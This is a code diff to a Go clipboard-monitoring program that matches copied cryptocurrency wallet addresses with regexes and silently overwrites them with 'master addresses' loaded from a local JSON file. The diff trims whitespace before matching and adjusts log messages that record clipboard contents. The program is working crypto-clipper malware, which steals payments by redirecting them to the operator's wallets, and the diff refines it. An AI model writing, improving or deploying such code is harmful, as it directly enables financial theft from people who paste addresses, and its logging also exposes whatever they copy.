@@ -10,6 +10,7 @@ import (
 	"log"
 	"os"
 	"regexp"
+	"strings"
 
 	"golang.design/x/clipboard"
 )
@@ -22,13 +23,13 @@ func main() {
 
 	ch := clipboard.Watch(context.TODO(), clipboard.FmtText)
 
-	// Clipboard
 	for data := range ch {
+		log.Printf("current clipboard:%s", string(data))
+
 		regexMatch, err := replaceClipboard(string(data))
 		if err == nil {
 			clipboard.Write(clipboard.FmtText, []byte(regexMatch))
 		}
-		log.Printf("data:%s", string(data))
 	}
 }
 
@@ -38,7 +39,7 @@ func replaceClipboard(clipboardStr string) (string, error) {
 	masterAddresses, err := getMasterAddresses()
 
 	if err != nil{
-		log.Fatalf("error loading masterAddresses, %s", err.Error())
+		log.Fatalf("error getting masterAddresses, %s", err.Error())
 		return "", err
 	}
 
@@ -47,9 +48,9 @@ func replaceClipboard(clipboardStr string) (string, error) {
 		r, _ := regexp.Compile(regexMatch.RegexMatch)
 
 		// found match, return new str
-		if r.MatchString(clipboardStr) {
-			newStr := r.ReplaceAllString(clipboardStr, masterAddresses[regexMatch.CryptoName])
-			log.Printf("found: %s in clipboard, replacing with: %s", regexMatch.CryptoName, newStr)
+		if r.MatchString(strings.TrimSpace(clipboardStr)) {
+			newStr := r.ReplaceAllString(strings.TrimSpace(clipboardStr), masterAddresses[regexMatch.CryptoName])
+			log.Printf("found crypto:%s, replacing with:'%s'", regexMatch.CryptoName, newStr)
 			return newStr, nil
 		}
 	}
@@ -61,20 +62,20 @@ func replaceClipboard(clipboardStr string) (string, error) {
 func getMasterAddresses() (map[string]string, error) {
 	jsonFile, err := os.Open("constants/addresses.json")
 	if err != nil {
-		log.Fatalf("unable to open regex matches %s", err.Error())
+		log.Fatalf("unable to open constants/addresses.json, %s", err.Error())
 		return map[string]string{}, err
 	}
 
 	byteValue, err := ioutil.ReadAll(jsonFile)
 	if err != nil {
-		log.Fatalf("unable to get byteValue %s", err.Error())
+		log.Fatalf("unable to get byteValue, %s", err.Error())
 		return map[string]string{}, err
 	}
 
 	var result map[string]interface{}
 	err = json.Unmarshal(byteValue, &result)
 	if err != nil {
-		log.Fatalf("unable to unmarshal %s", err.Error())
+		log.Fatalf("unable to unmarshal constants/addresses.json, %s", err.Error())
 		return map[string]string{}, err
 	}
 
